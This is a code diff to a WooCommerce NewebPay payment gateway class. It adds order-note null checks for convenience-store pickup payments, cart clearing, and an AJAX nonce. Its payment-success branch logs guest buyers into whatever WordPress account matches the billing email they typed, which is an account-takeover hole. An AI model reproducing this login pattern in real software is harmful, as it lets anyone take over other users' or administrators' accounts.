@@ -88,6 +88,18 @@ class WC_newebpay extends baseNwpMPG
     public $InvMerchantID;
 
     /**
+     * CVS COM Not Payed Setting
+     * @var int
+     */
+    public $nwpCVSCOMNotPayed;
+
+    /**
+     * Selected Payment Method
+     * @var string
+     */
+    public $nwpSelectedPayment;
+
+    /**
      * Invoice Hash Key
      * @var string
      */
@@ -326,13 +338,19 @@ class WC_newebpay extends baseNwpMPG
         
         $custom_cvscom_not_payed = $order->get_meta('_CVSCOMNotPayed') ?? '';
 
+        // 取得訂單備註
+        $notes = wc_get_order_notes(array(
+            'order_id' => $order->get_id(),
+            'type' => 'customer'
+        ));
+
         // 超商取貨(CVSCOM: 1:取貨不付款 2:取貨付款)
         if ($custom_cvscom_not_payed == '1' && $cvscom_not_payed == '1') {
             $post_data['CVSCOM'] = '1';
-            if($notes[0]->comment_content == 'CVSCOMPayed'){
+            if (!empty($notes) && isset($notes[0]->comment_content) && $notes[0]->comment_content == 'CVSCOMPayed') {
                 $post_data['CVSCOM'] = '2';
             }
-        } elseif ($cvscom_payed == '1' && $notes[0]->comment_content == 'CVSCOMPayed') {
+        } elseif ($cvscom_payed == '1' && !empty($notes) && isset($notes[0]->comment_content) && $notes[0]->comment_content == 'CVSCOMPayed') {
             $post_data['CVSCOM'] = '2';
         } 
 
@@ -504,7 +522,44 @@ class WC_newebpay extends baseNwpMPG
                 ));
             }
         } else {
+            // 付款成功處理
             $order->update_status('processing');
+            
+            // 清空購物車 - 只有在付款成功且購物車不為空時才清空
+            if (WC()->cart && !WC()->cart->is_empty()) {
+                WC()->cart->empty_cart();
+            }
+            
+            // 如果是訪客結帳，嘗試自動登入 (如果用戶帳號存在)
+            if (!is_user_logged_in()) {
+                $user_email = $order->get_billing_email();
+                if (!empty($user_email)) {
+                    $user = get_user_by('email', $user_email);
+                    if ($user && !is_wp_error($user)) {
+                        wp_set_current_user($user->ID);
+                        wp_set_auth_cookie($user->ID, true);
+                        
+                        // 添加訂單備註記錄自動登入
+                        $order->add_order_note(__('Customer automatically logged in after payment', 'newebpay-payment'));
+                    }
+                }
+            } else {
+                // 如果已經登入但訂單的用戶 ID 不一致，更新訂單的客戶 ID
+                $current_user_id = get_current_user_id();
+                $order_user_id = $order->get_user_id();
+                
+                if ($order_user_id == 0 && $current_user_id > 0) {
+                    // 如果訂單是訪客訂單但現在有登入用戶，將訂單關聯到該用戶
+                    $user_email = $order->get_billing_email();
+                    $current_user_email = wp_get_current_user()->user_email;
+                    
+                    if ($user_email === $current_user_email) {
+                        $order->set_customer_id($current_user_id);
+                        $order->save();
+                        $order->add_order_note(__('Order linked to logged-in customer after payment', 'newebpay-payment'));
+                    }
+                }
+            }
         }
 
         return $result;
@@ -1067,6 +1122,12 @@ class WC_newebpay extends baseNwpMPG
                 plugins_url('assets/js/admin/newebpayAdminAjax.js', dirname(dirname(__FILE__))),
                 array('jquery')
             );
+            
+            // 傳遞 ajaxurl 給 JavaScript
+            wp_localize_script('queryTrade', 'newebpay_ajax', array(
+                'ajaxurl' => admin_url('admin-ajax.php'),
+                'nonce' => wp_create_nonce('newebpay_nonce')
+            ));
         }
     }
 }
